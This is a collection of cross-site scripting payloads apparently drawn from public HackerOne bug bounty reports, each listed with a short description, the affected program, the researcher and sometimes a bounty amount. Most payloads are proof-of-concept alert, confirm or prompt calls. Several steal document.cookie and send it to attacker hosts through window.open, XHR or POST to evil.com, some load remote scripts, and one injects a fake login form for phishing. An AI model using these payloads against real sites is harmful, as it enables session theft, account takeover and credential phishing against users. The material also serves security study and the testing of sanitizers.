## DOM‑based XSS that steals the document.cookie and opens it via window.open

### `a17e914f`

```
Browse to                                                                 "a='http%3a%2f%2f███';b='%3Fcookie=';c=btoa(document.cookie);window.open(a%2bb%2bc)">
```

— [Reflected XSS at www.███████ at /██████████ via the ████████ parameter](https://hackerone.com/reports/1173593) · U.S. Dept Of Defense · [z32](https://hackerone.com/z32)


## DOM XSS via javascript: URL with SVG onload payload

### `51d3ce0d`

```
location='javascript:\x3csvg\x20onload=alert\x28document.domain\x29\x3e'
```

— [XSS \[flow\] - on target.com/paypalme/my/landing (requires user interaction)](https://hackerone.com/reports/425200) · PayPal · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## Dot‑prefixed JavaScript payload in markdown content that is transformed into a javascript: URI

### `4de91efe`

```
.alert(1);
```

**Parameter:** `content`
— [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) · GitLab · [ryhmnlfj](https://hackerone.com/ryhmnlfj)


## Embedded <script> tag in spreadsheet cell HTML table causing XSS

### `308337c0`

```
<table>
        <tbody><tr>
            <td><script>alert(`xss!`)</script></td>
            <td>test</td>
            <td>another</td>
        </tr>
        <tr>
            <td>1</td>
            <td>2</td>
            <td>3</td>
        </tr>
    </tbody></table>
```

— [\[exceljs\] Possible XSS via cell value when worksheet is displayed in browser](https://hackerone.com/reports/356809) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## Embedding an <iframe> with a data:text/html;base64 payload that runs alert via script (data URL XSS)

### `15f77bc0`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="███████" method="POST">
      <input type="hidden" name="doImports" value="false" />
      <input type="hidden" name="entryid" value="d00cc920&#45;e292&#45;4475&#45;8e23&#45;c6cbf69f5725" />
      <input type="hidden" name="wikitext" value="&#123;&#123;information&#32;details&#61;true&#125;&#125;&#32;&#123;&#123;tabletree&#32;&#32;message&#61;&quot;&quot;&#125;&#125;&lt;iframe&#32;src&#61;&quot;data&#58;
```

**Parameter:** `wikitext`
— [Cross-Site Scripting via 'wikitext' parameter](https://hackerone.com/reports/3137212) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)


## Encoded HTML injection in a query parameter leading to XSS (using <br> and confirm)

### `e71a2f6d`

```
https://████████/██████=█████████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

— [XSS on https://████/ via ███████ parameter](https://hackerone.com/reports/1251868) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)


## Encoded <video><source onerror=javascript:alert(1) payload in a URL (XSS)

### `c4bbc333`

```
https://target.com/combine/;%3Cvideo%3E%3Csource%20onerror=%22javascript:alert(1
```

— [XSS](https://hackerone.com/reports/219170) · Ubiquiti Inc. · [linkks](https://hackerone.com/linkks)


## Flash-based XSS via unfiltered 'onload' parameter in SWF URL

### `74791695`

```
https://target.com/swf/storage.swf?onload=alert(1)
```

**Parameter:** `onload`
— [https://target.com storage.swf XSS](https://hackerone.com/reports/9522) · Automattic · [smiegles](https://hackerone.com/smiegles)


## Flash SWF onMouseOver parameter XSS

### `5c14f17f`

```
http://target.com/swf/photo_uploader_lite.swf?h=h?&onMouseOver=document.write(window.location.hash.substr(1))#<script>alert(document.domain)</script>
```

**Parameter:** `onMouseOver`
— [XSS at http://target.com on IE using flash files](https://hackerone.com/reports/66121) · target.com · [tunnelshade](https://hackerone.com/tunnelshade) · $500.0


## Flash (SWF) XSS via the playerready query parameter

### `fbed3868`

```
https://target.com/jwplayer/player.swf?playerready=alert(document.domain
```

**Parameter:** `playerready`
— [Reflected XSS on target.com  via player.swf](https://hackerone.com/reports/386340) · Chaturbate · [nahamsec](https://hackerone.com/nahamsec)


## Flash (SWF) XSS via readyFunction parameter injection

### `30569b4b`

```
https://target.com/1player/tags/1.3/players/video-js/video-js.swf?readyFunction=alert(%27Hello%27
```

— [Reflected Swf XSS In ( target.com )](https://hackerone.com/reports/270060) · WordPress · [m7mdharoun](https://hackerone.com/m7mdharoun)


## HTML attribute injection in a meta tag's content attribute to execute script

### `9b5da643`

```
<meta name="author" content="Evil &lt;script nonce=%READER-TITLE-NONCE%&gt;alert(document.location);&lt;/script&gt;!--">
```

**Parameter:** `content`
— [New XSS vector in ReaderMode with %READER-TITLE-NONCE%](https://hackerone.com/reports/1436142) · Brave Software · [nishimunea](https://hackerone.com/nishimunea) · $1,000.0


## HTML attribute injection using onclick handler

### `1efb72f0`

```
locals" onclick=alert('XSS!') "'>
```

**Parameter:** `Name`
— [Stored XSS in Name field in User Groups/Group Details form](https://hackerone.com/reports/247521) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)


## HTML attribute injection using onload/alert in gl-emoji tag to bypass CSP

### `9b2ce555`

```
<pre data-sourcepos="&#34; href=&#34;x&#34;></pre>
<gl-emoji data-name='&#34;x=&#34y&#34 onload=&#34;alert(document.location.href)&#34;' data-unicode-version='x'>
abc
</gl-emoji>
<pre x=&#34;">
<code></code></pre>
```

— [Stored XSS on issue comments and other pages which contain notes](https://hackerone.com/reports/1398305) · GitLab · [jarij](https://hackerone.com/jarij) · $3,000.0


## HTML attribute injection (onmouseover) with base tag to execute JavaScript

### `40de25e9`

```
'"><div id="test"><head><base href="javascript://"/></head><body><a href="/. /, /' onmouseover=confirm(document.domain); abc=abc">TESTLINK
```

**Parameter:** `blog`
— [\[target.com\] Stored XSS via Crafted Developer App Description](https://hackerone.com/reports/293743) · Automattic · [ysx](https://hackerone.com/ysx)


## HTML attribute XSS using img onerror handler

### `2e0a093c`

```
Test <img src=x onerror=alert(2)>
```

— [H1514 Stored XSS in Return Magic App portal content](https://hackerone.com/reports/420459) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)


## HTML email XSS via injected <script> tag and base64‑decoded payload

### `c26bc479`

```
<html><head>
        <meta id="meta-viewport" name="viewport" content="width=412" contenteditable="false">
        <style>
            .mail-message-content pre {
                white-space: pre-wrap !important;
            }

            .initial-load {
                /* 0x0 and 1x1 may be short-circuited by WebView */
                width: 2px;
                height: 0px;
                -webkit-transform: translate3d(0, 0, 1px);
                -webkit-animation-name: initial-load-noop-an
```

— [Blind XSS in the rocket.chat registration email](https://hackerone.com/reports/382666) · Rocket.Chat · [edoverflow](https://hackerone.com/edoverflow)


## HTML‑entity‑encoded JavaScript‑URL XSS bypass

### `93d24943`

```
javascript&#3A;alert(1);
```

— [Stored XSS in Post Preview as Contributor](https://hackerone.com/reports/497724) · WordPress · [simonscannell](https://hackerone.com/simonscannell)


## HTML entity‑encoded XSS via <img src=x onerror=...> attribute

### `9f11012f`

```
&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x onerror=prompt(document.domain)&#62;
```

**Parameter:** `name`
— [Stored XSS in Question edit for product name (bypass #1416672)](https://hackerone.com/reports/1428207) · Judge.me  · [chupa__chups](https://hackerone.com/chupa__chups)


## HTML iframe injection (XSS) via a text button / form field

### `12f1050f`

```
3. Click the text button and inject : <iframe src="                 "></iframe>
```

— [XSS trigger via HTML Iframe injection in ( https://██████████ ) due to unfiltered HTML tags](https://hackerone.com/reports/1200770) · U.S. Dept Of Defense · [basant0x01](https://hackerone.com/basant0x01)


## HTML image link with huge dimensions to overlay the page (clickjacking)

### `976df397`

```
<div class="md md-file">
  <p>Full Page link</p>
  <p><a href="a" rel="nofollow"></a><a href="https://target.com/users/signin" class="atwho-view select2-drop-mask pika-select" rel="nofollow"><img height="10000" width="10000"></a></p>
</div>
```

— [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,500.0


## HTML injection via account name field

### `ba7dbc0f`

```
"><script src=https://target.com></script>
```

**Parameter:** `name`
— [Blind stored xss \[target.com\] > name parameter ](https://hackerone.com/reports/251224) · Grab · [paresh_parmar](https://hackerone.com/paresh_parmar) · $750.0


## HTML injection allowing stored XSS

### `839e0276`

```
<pre class="zen-backdrop fullscreen sherlock-line-samples-table center">
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<img src="https://target.com/images/press/logo/wm_no_bg.svg" width="500">
<h2>Hello there! Something has gone wrong, we are working on it.</h2>
<h3>In the meantime, play a game with us at <a href="http://example.com/">example.com</a>.</h3>
</pre>
```

— [Unfiltered `class` attribute in markdown code](https://hackerone.com/reports/216453) · GitLab · [chalker](https://hackerone.com/chalker)


## HTML injection via Android Intent extra 'smSPageHTML' leading to WebView XSS

### `67ab4ffe`

```
Intent exnessIntent = getPackageManager().getLaunchIntentForPackage("com.exness.investments");
startActivity(exnessIntent);
final Intent intent = new Intent("android.intent.action.VIEW");
intent.putExtra("smSPageHTML", "<h1>Exploited</h1><script>location.href='/r/'</script>");
intent.putExtra("smSPageURL", "https://target.com/r/");
try {
    intent.setClassName(createPackageContext("com.exness.investments", Context.CONTEXT_IGNORE_SECURITY), "com.surveymonkey.surveymonkeyandroidsdk.SMFeedback
```

**Parameter:** `smSPageHTML`
— [Improper Implementation of SDK Allows Universal XSS in Webview Leading to Account Takeover](https://hackerone.com/reports/1455987) · EXNESS · [holyfield](https://hackerone.com/holyfield)


## HTML injection breaking attribute to inject script tag (XSS)

### `54266616`

```
3. Capture the request on burp, change the payload on the █████████ field to "><script>alert("XSS by nagli")></script>
```

— [POST based RXSS on https://███████/ via ███ parameter](https://hackerone.com/reports/998935) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)


## HTML injection using empty <iframe srcdoc> tag (XSS)

### `0c9c6193`

```
<iframe srcdoc>
```

— [Stored XSS in Mermaid when viewing Markdown files](https://hackerone.com/reports/1212822) · GitLab · [saleemrashid](https://hackerone.com/saleemrashid)


## HTML injection fragment used for XSS

### `13ea05aa`

```
);"> <a href="                     "><img src="                                   "></a>qwqw#check-tx-status
```

— [Html injection target.com](https://hackerone.com/reports/324548) · MyCrypto · [w2w](https://hackerone.com/w2w)


## HTML injection of an iframe pointing to a vulnerable Marketo form

### `231dee0b`

```
<iframe id="x" name="x" border="0" frameborder="0" width="100" height="30" src="https://target.com/index.php/form/XDFrame"></iframe>
```

— [Stealing contact form data on target.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) · HackerOne · [fransrosen](https://hackerone.com/fransrosen)


## HTML injection with image onerror attribute to execute JavaScript

### `8ea068b5`

```
</h6><image/src/onerror=alert(document.cookie)>
```

— [Reflected Cross-site Scripting via search query on ██████](https://hackerone.com/reports/2434904) · U.S. Dept Of Defense · [neg0x](https://hackerone.com/neg0x)


## HTML injection via JSON field 'bodyHtml' containing a <script> payload

### `6cd52ba3`

```
{
  "status": "ok",
  "code": 200,
  "data": {
    "content": [
      {
        "source": 0,
        "collectionId": "131560603",
        "content": {
          "generator": {
            "id": "target.com"
          },
          "bodyHtml": "<marquee>XSS</marquee><script>alert(\"XSS on \"+ document.domain)</script>",
          "annotations": {
            "likedBy": [
              "54c1e33eb841b37995000d5d@engadget.evil.com"
            ]
          },
          "authorId": "50782a81bc6bf341d3
```

**Parameter:** `bodyHtml`
— [Reflected XSS via Livefyre Media Wall in target.com](https://hackerone.com/reports/134061) · Uber · [mdv](https://hackerone.com/mdv) · $2,000.0


## HTML injection loading external script via data-remote attribute

### `a6dce1ba`

```
<form>any <b>html</b> can go <button>here<a data-remote="true" data-method="get" data-type="script" href="https://target.com/-/snippets/1999974/raw" class="atwho-view select2-drop-mask pika-select">
  <img width="10000" height="10000">
</a></button></form>
```

— [SafeParamsHelper::safe_params is not so safe](https://hackerone.com/reports/946728) · GitLab · [vakzz](https://hackerone.com/vakzz) · $4,000.0


## HTML injection using a malformed URL to inject an <img> tag (XSS)

### `cec0693f`

```
http://\<img\
```

— [Vulnerability with the way \ escaped characters in <http://target.com> style links are rendered](https://hackerone.com/reports/46072) · HackerOne · [danlec](https://hackerone.com/danlec) · $5,000.0


## HTML injection via malicious filename in a File object causing an onerror XSS

### `10edb466`

```
let shop = prompt("Enter a Target Shop URL:", "https://target.com");
let frame = document.createElement("iframe");
frame.src = `${shop}/1337/digital_wallets/dialog`;
frame.style.display = "none";
frame.onload = () => {
  frame.contentWindow.postMessage({
    type: "DigitalWalletsDialog:change",
    digitalWalletsDialog: true,
    payload: {
      title: "placeholder",
      button: "placeholder",
      lineItems: [new File([""], "<img src=xx: onerror=alert(documen
```

— [XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener on "/:id/digital_wallets/dialog"](https://hackerone.com/reports/231053) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $3,000.0


## HTML injection with onmouseover event handler (XSS)

### `63fde2c1`

```
</title></head><html onmouseover=alert(2)>
```

**Parameter:** `first_name`
— [Unauthenticated Stored XSS on <any>.target.com via checkout page](https://hackerone.com/reports/189378) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)


## HTML injection of a <script> tag (XSS) via the unsanitized author parameter

### `fd044ef6`

```
<script></script>
```

**Parameter:** `author`
— [Stored XSS in comments on https://target.com/blog/*](https://hackerone.com/reports/218226) · Starbucks · [bayotop](https://hackerone.com/bayotop)


## HTML injection (script tags) delivered via SSRF to achieve XSS

### `a1bb52f5`

```
<h1>JUTSUCE RFI TEST</h1>
<script>alert(document.cookie)</script>
<script>alert('jutsuce')</script>
```

— [Remote File Inclusion, Malicious File Hosting, and Cross-site Scripting (XSS) in ████████](https://hackerone.com/reports/192940) · U.S. Dept Of Defense · [jutsuce](https://hackerone.com/jutsuce)


## HTML injection via URL parameter 'currency' using encoded <svg onload> payload

### `5ca35cc8`

```
https://target.com/website/?currency=%3C/title%3E%3C/script/%22-alert%280%29-%22--%3E%22%3E%3Csvg/onload=prompt%28document.domain%29%3E
```

**Parameter:** `currency`
— [XSS on target.com](https://hackerone.com/reports/133963) · Automattic · [spam404](https://hackerone.com/spam404)


## HTML injection XSS via image tag in search query

### `a11180c5`

```
urban dictionary "><img src=x<
```

**Parameter:** `q`
— [Reflected/Stored XSS on target.com](https://hackerone.com/reports/1110229) · DuckDuckGo · [monke](https://hackerone.com/monke)


## HTML injection XSS using an <img> tag with an onerror attribute in post content

### `ed6713c2`

```
1.  "><img src=x onerror=alert("XSS")>
```

— [Stored XSS (Hexo-admin plugin)](https://hackerone.com/reports/716570) · Node.js third-party modules · [vu1n](https://hackerone.com/vu1n)


## HTML <object> tag injection loading an external scriptlet

### `08394dce`

```
<object type="text/x-scriptlet" data="https://target.com/scriptlet.html"></object>
```

**Parameter:** `last_name`
— [Stored XSS in Dovetale by application of creator](https://hackerone.com/reports/1652046) · Shopify · [kun_19](https://hackerone.com/kun_19) · $1,600.0


## HTML page with script injection for cookie exfiltration (XSS)

### `bfbf69ee`

```
<html>

<head>
<title>Grammarly POC</title>
<meta charset="utf-8"/>
<script src="https://target.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>

<body>
<script>

    var cookie_hax = {
        "gnar_containerId":"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr"+"ipt><noscript>",
    };

    for (var name in cookie_hax) {
        $.ajax({
            type: "POST",
            url: "https://evil.com/cookies?name=" + name + "&value=" + encodeURICompon
```

— [Account takeover through the combination of cookie manipulation and XSS](https://hackerone.com/reports/534450) · Superhuman (formerly Grammarly) · [k4r4koyun](https://hackerone.com/k4r4koyun)


## HTML <script> tag injection with external source

### `683caee6`

```
<script src=//u00f1.xyz>
```

— [XSS on target.com/home after other user follows you](https://hackerone.com/reports/87854) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## HTML tag combination (select + style) XSS via embedded <script>

### `585e021f`

```
<select><style><script>alert("XSS")</script></style></select>
```

**Parameter:** `name`
— [Incomplete fix for CVE-2022-32209 (XSS in Rails::Html::Sanitizer under certain configurations)](https://hackerone.com/reports/1654310) · Ruby on Rails · [0b5cur17y](https://hackerone.com/0b5cur17y)


## HTML tag injection breaking out of attribute and inserting <script src>

### `a13dd4ce`

```
"><script src=//u00f1.xyz>
```

— [XSS on mobile version of target.com where the button "Follow" appears](https://hackerone.com/reports/88088) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## HTML tag injection via filename causing XSS in directory listing

### `2f19f667`

```
<iframe>
```

— [\[statics-server\] XSS via injected iframe in file name when statics-server displays directory index in the browser](https://hackerone.com/reports/355458) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## HTML tag injection including javascript: URL to trigger XSS

### `375e6187`

```
<img src=1111111><img src=1111111><a href="javascript:alert&#40/1/&#41">axxx</a><svg></svg><img src=1>
```

— [Timeline Editor Self-XSS (Previous Fix #738072 Incomplete)](https://hackerone.com/reports/755679) · Shopify · [mosuan](https://hackerone.com/mosuan) · $500.0


## HTML tag injection XSS using mismatched </noscript> and <script> tags

### `7fdff144`

```
<%= sanitize '<noscript><p id="</noscript><script>alert(1)</script>"></noscript>' %>
```

— [ActionView sanitize helper bypass with noscript](https://hackerone.com/reports/2931691) · Internet Bug Bounty · [taise](https://hackerone.com/taise)


## HTML tag XSS payload injecting onmouseover alert via <img> element

### `ec2eaa43`

```
<img src=x onmouseover=alert(1)>
```

— [\[http_server\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/578138) · Node.js third-party modules · [lightangel1412](https://hackerone.com/lightangel1412)


## HTTP header injection leading to script tag XSS

### `188aae76`

```
foo"><script src=//target.com/2.js></script><x=".com
```

— [XSS via X-Forwarded-Host header](https://hackerone.com/reports/882220) · U.S. Dept Of Defense · [geeknik](https://hackerone.com/geeknik)


## IE CSS expression XSS via style query parameter

### `4a0dd659`

```
https://target.com/products/c-of-change?shop=evil.com&style=h%20.product-buy-button{x:expression(alert(1
```

**Parameter:** `style`
— [many xss in target.com](https://hackerone.com/reports/105659) · Shopify · [sergeym](https://hackerone.com/sergeym) · $500.0


## Image onerror event executing JavaScript to exfiltrate cookies via XHR (DOM XSS)

### `71037f89`

```
- change the filename to \"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();
```

**Parameter:** `filename`
— [Blind XSS on image upload](https://hackerone.com/reports/1010466) · CS Money · [benjamin-mauss](https://hackerone.com/benjamin-mauss) · $1,000.0


## Image onerror XSS via crafted URL

### `1f2bcc05`

```
http://target.com/gallery/iT5l7%22%3E%3Cimg%20src=x%20onerror=alert(1
```

— [XSS target.com](https://hackerone.com/reports/97938) · Imgur · [charfee](https://hackerone.com/charfee)


## Image onerror XSS injection

### `cda124b8`

```
'"><img src=x onerror=alert(1) x=y
```

**Parameter:** `County`
— [WooCommerce: Persistent XSS via customer address (state/county)](https://hackerone.com/reports/530499) · Automattic · [foobar7](https://hackerone.com/foobar7)


## Image onerror XSS payload injecting JavaScript to exfiltrate cookies

### `dfaee687`

```
><img src="X" onerror=top[8680439..toString(30)](1337+document.cookie)>
```

**Parameter:** `subject`
— [Stored XSS in Email Notifcation ](https://hackerone.com/reports/1597271) · Insightly · [khaledx](https://hackerone.com/khaledx)


## Image tag onerror JavaScript injection via markdown

### `e43f4eef`

```
[<img/src="."/onerror=alert("search")>](a)
```

— [XSS in HTML generated by RDoc](https://hackerone.com/reports/1187156) · Ruby · [ooooooo_q](https://hackerone.com/ooooooo_q)


## Injected modal login form for credential phishing

### `3558f1b5`

```
a form
{
<div class="modal show d-block">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h3 class="page-title">Please Log In</h3>
</div>
<div class="modal-body">
<form class="new-wiki-page" action="http://target.com/">
<div class="form-group">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="passwor
```

— [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,500.0


## JavaScript alert payload executed via SVG XSS

### `40c8d7c9`

```
alert('XSS execution on: localhost:8080')
```

— [Stored XSS via SVG Upload — check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)](https://hackerone.com/reports/3606773) · phpBB · [a7mmr](https://hackerone.com/a7mmr)


## JavaScript code injection via comment‑trick payload

### `3e091f60`

```
//https://target.com
alert(1);
//https://target.com
```

— [Stored XSS in the Custom Logo link (non-Basic plan required)](https://hackerone.com/reports/282209) · Infogram · [sp1d3rs](https://hackerone.com/sp1d3rs)


## JavaScript expression injection (document.domain) for XSS

### `a2acbd2f`

```
document.domain
```

— [Stored XSS in the Custom Logo link (non-Basic plan required)](https://hackerone.com/reports/282209) · Infogram · [sp1d3rs](https://hackerone.com/sp1d3rs)


## JavaScript injection via malformed href attribute (javascript: URL)

### `a31550a4`

```
javascript: window.open(&quot;https://target.com/intent/tweet?text=Answer on @Quora by @User to Question? http://evil.com/nnnn&quot;, &quot;Share Answer to Twitter&quot;, &quot;width=600, height=250&quot;)
```

**Parameter:** `href`
— [XSS when clicking "Share to Twitter" at target.com/widgets/embed_iframe?path=...](https://hackerone.com/reports/258876) · Quora · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## JavaScript injection in URL path leading to reflected XSS

### `3c2b7ea7`

```
target.com/international/live/5/5/1})}});alert(document.cookie);(test=>{{({<!--
```

**Parameter:** `url`
— [Reflected XSS in target.com](https://hackerone.com/reports/292457) · Valve · [jr0ch17](https://hackerone.com/jr0ch17)


## JavaScript injection XSS payload (alert())

### `e356fa7e`

```
alert()
```

— [Reflected XSS on target.com/index.html?view=upload_form](https://hackerone.com/reports/31187) · Bookfresh · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## JavaScript URI fragment injection (javascript:alert) for XSS

### `a401c176`

```
javascript:alert
```

— [Stored XSS in the Custom Logo link (non-Basic plan required)](https://hackerone.com/reports/282209) · Infogram · [sp1d3rs](https://hackerone.com/sp1d3rs)


## JavaScript URI in href attribute (javascript:alert) for reflected XSS

### `ae16ce5e`

```
TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
```

**Parameter:** `subject`
— [Possible DOM XSS on target.com](https://hackerone.com/reports/1010132) · Basecamp · [enigmaticjohn](https://hackerone.com/enigmaticjohn)


## JavaScript URI injection via angle‑bracketed input placed in an href attribute

### `b7e400d3`

```
<javascript:alert(document.cookie);>
```

— [Stored XSS in Slackbot Direct Messages](https://hackerone.com/reports/4561) · Slack · [prakharprasad](https://hackerone.com/prakharprasad)


## JavaScript URI injection leading to XSS via a redirect URL in JSON response

### `f7fb273f`

```
{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"javascript:alert(document.domain);//","aliId":17144124}}}
```

— [DOM Based XSS in target.com via PostMessage](https://hackerone.com/reports/398054) · HackerOne · [adac95](https://hackerone.com/adac95) · $500.0


## JavaScript URI injection using a newline to bypass scheme validation

### `b5b24c10`

```
javascript
:alert('xss')
```

— [Persistent XSS: Editor link](https://hackerone.com/reports/4114) · Phabricator · [tomvg](https://hackerone.com/tomvg) · $300.0


## JavaScript URI injection via query parameter

### `49f013a0`

```
https://target.com/vakzz-h1/redirect1/-/issues?script_name=javascript:alert(1
```

**Parameter:** `script_name`
— [SafeParamsHelper::safe_params is not so safe](https://hackerone.com/reports/946728) · GitLab · [vakzz](https://hackerone.com/vakzz) · $4,000.0


## JavaScript URI injection via service parameter in logout URL

### `8a918fe8`

```
https://██████████/██████/logout?service=javascript:alert(1
```

**Parameter:** `service`
— [Rxss on █████████ via logout?service=javascript:alert(1)](https://hackerone.com/reports/1406598) · U.S. Dept Of Defense · [m00n_knight](https://hackerone.com/m00n_knight)


## JavaScript URI injection via title field using a scheme‑like string

### `f22e121d`

```
javascript:STRING_EXPECTED_REMOVING
```

**Parameter:** `title`
— [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) · GitLab · [ryhmnlfj](https://hackerone.com/ryhmnlfj)


## JavaScript URI scheme with newline to execute alert() (javascript: XSS)

### `bc678d52`

```
javascript://%0aalert(1)
```

— [Possible XSS vulnerability without a content security bypass](https://hackerone.com/reports/1804177) · Stripe · [saajanbhujel](https://hackerone.com/saajanbhujel) · $2,000.0


## JavaScript URI scheme XSS via URL parameter

### `b0b531ad`

```
url=JAVASCRIPT:some-payload
```

**Parameter:** `url`
— [Query parameter reordering causes redirect page to render unsafe URL](https://hackerone.com/reports/293689) · HackerOne · [kenziy](https://hackerone.com/kenziy) · $1,500.0


## JavaScript URI XSS

### `6344d540`

```
javascript:alert(document.domain) //http://target.com/uploads/pwned.jpg
```

— [Strored Cross Site Scripting](https://hackerone.com/reports/106636) · Shopify · [hussein98d](https://hackerone.com/hussein98d) · $500.0


## JavaScript URI XSS bypass using mixed‑case scheme and comment injection

### `bf4bd810`

```
javascripT://https://target.com%0aalert(1);//https://target.com
```

— [Stored XSS in the Custom Logo link (non-Basic plan required)](https://hackerone.com/reports/282209) · Infogram · [sp1d3rs](https://hackerone.com/sp1d3rs)


## JavaScript‑URI XSS via citySource parameter

### `07d90111`

```
http://target.com/community/daniel?citySource=javascript:alert(%27XSSED%27
```

**Parameter:** `citySource`
— [xss vulnerability in http://target.com/community/daniel](https://hackerone.com/reports/142946) · Uber · [netfuzzer](https://hackerone.com/netfuzzer)


## JavaScript URI XSS via a clickable link (http://javascript:alert(1))

### `f91b7f51`

```
http://javascript:alert(1)
```

— [\[Swiftype\] - Stored XSS via document field `url` triggers on `https://target.com/engines/<engine>/document_types/<type>/documents/<id>`](https://hackerone.com/reports/1245787) · Elastic · [superman85](https://hackerone.com/superman85)


## JavaScript URI XSS via href attribute

### `441e4dfd`

```
<a href="javascript:alert(2)">test 1</a>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0


## JavaScript‑URI XSS via the 'ionUrl' query parameter

### `793d8bcb`

```
https://target.com/shard/s1/client/snv?view=after-save-note&ionUrl=javascript:alert(document.cookie
```

**Parameter:** `ionUrl`
— [Reflected XSS in the shared note view on https://target.com](https://hackerone.com/reports/1518343) · Evernote · [sarka](https://hackerone.com/sarka) · $500.0


## JavaScript URI XSS via malicious homepage field in gemspec

### `1febf945`

```
Gem::Specification.new do |s|
  s.name = 'securitytest'
  s.version = '0.1.0'
  s.date = '2017-11-10'
  s.summary = "This is a proof-of-concept gem"
    s.description = "Select the WWW hyperlink."
    s.authors = ["Author Name"]
  s.homepage = 'javascript:confirm(document.domain)'
end
```

— [\[gem server\] Stored XSS via crafted JavaScript URL inclusion in Gemspec](https://hackerone.com/reports/289313) · RubyGems · [ysx](https://hackerone.com/ysx)


## JavaScript URI XSS via original_referer parameter

### `0b5e7c3a`

```
https://target.com/intent/favorite/complete?tweet_id=572435913768366080&already_favorited=false&original_referer=javascript:alert%281%29;
```

**Parameter:** `original_referer`
— [XSS in original referrer after follow](https://hackerone.com/reports/50134) · X / xAI · [akhil-reni](https://hackerone.com/akhil-reni)


## JavaScript URI XSS payload (javascript:alert)

### `b0c60379`

```
javascript:alert(document.domain);//https://evil.com/
```

— [DOM-Based XSS in target.com](https://hackerone.com/reports/882546) · Automattic · [keer0k](https://hackerone.com/keer0k)


## JavaScript URI XSS via player_url parameter

### `57b03a43`

```
javascript:
```

**Parameter:** `player_url`
— [Multiple DOMXSS on Amplify Web Player](https://hackerone.com/reports/88719) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)


## JavaScript URI XSS that redirects to attacker site to steal document.cookie

### `838402dd`

```
https://target.com/cookie.php?cookie=document.cookie
```

— [xss stored](https://hackerone.com/reports/798599) · Shopify · [davscol94](https://hackerone.com/davscol94)


## JavaScript URI XSS in reStructuredText link

### `f74c5336`

```
`Security test link`__.

__ javascript:alert(document.domain)
```

— [\[reStructuredText\] XSS in project README files](https://hackerone.com/reports/205497) · GitLab · [ysx](https://hackerone.com/ysx)


## JavaScript‑URI XSS stored in a redirect address field

### `bfd5ea37`

```
javascript:alert(document.cookie)
```

— [\[target.com\] - XSS when adjust block Poll - Confirmation Message -  On submission:Redirect to another webpage - Redirect address:\[xss_payload\]](https://hackerone.com/reports/1050733) · Automattic · [superman85](https://hackerone.com/superman85)


## JavaScript‑URI XSS by supplying a 'javascript:' URL in the 'next_url' parameter

### `ac6b8b2a`

```
https://target.com/resign_request/success?next_url=javascript%3Aalert%2F**%2F(document.domain
```

**Parameter:** `next_url`
— [XSS Reflected at https://target.com/ Via `next_url`](https://hackerone.com/reports/1503601) · pixiv · [find_me_here](https://hackerone.com/find_me_here)


## JavaScript URI XSS in Textile link

### `f0826111`

```
"Security test link":javascript:alert(document.domain)
```

— [\[Textile\] XSS in project README files](https://hackerone.com/reports/205498) · GitLab · [ysx](https://hackerone.com/ysx)


## JavaScript URI XSS via URL parameter (javascript:alert)

### `3fd9fdfe`

```
https://target.com/widgets/share/tool?url=https%3A%2F%2Fevil2.com%2F&title=%3Ca%20href=%22javascript:alert(document.domain);//http://evil.com/%22%3Eclick%20me%3C/a%3E&selection=click%20in%20the%20link%20after%20reblog&shareSource=chrome_extension
```

— [DOM-Based XSS in target.com](https://hackerone.com/reports/882546) · Automattic · [keer0k](https://hackerone.com/keer0k)


## JavaScript URI XSS via xlink:href attribute

### `5b980b57`

```
<a xlink:href="javascript:alert(2)">test 2</a>
```

